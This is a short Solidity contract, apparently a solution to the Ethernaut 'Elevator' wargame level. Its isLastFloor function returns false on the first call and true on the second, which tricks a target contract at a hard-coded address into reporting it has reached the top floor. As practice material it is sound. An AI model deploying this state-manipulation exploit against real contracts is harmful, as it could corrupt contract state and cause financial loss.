// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
	function goTo(uint) external;
}




contract Building {
	uint private lastFloor;
	uint private x = 0;

	function isLastFloor(uint floor) external returns (bool) {
		if(x == 0){
			x++;
			return false;
		}
		else {
			return true;
		}
	}


	function CallAnElevator() public {
        address TARGET_ELEVATOR = 0x70f5021ea22A15c68150d02695d0E51850E495af;

		Elevator(TARGET_ELEVATOR).goTo(lastFloor);
	}


}
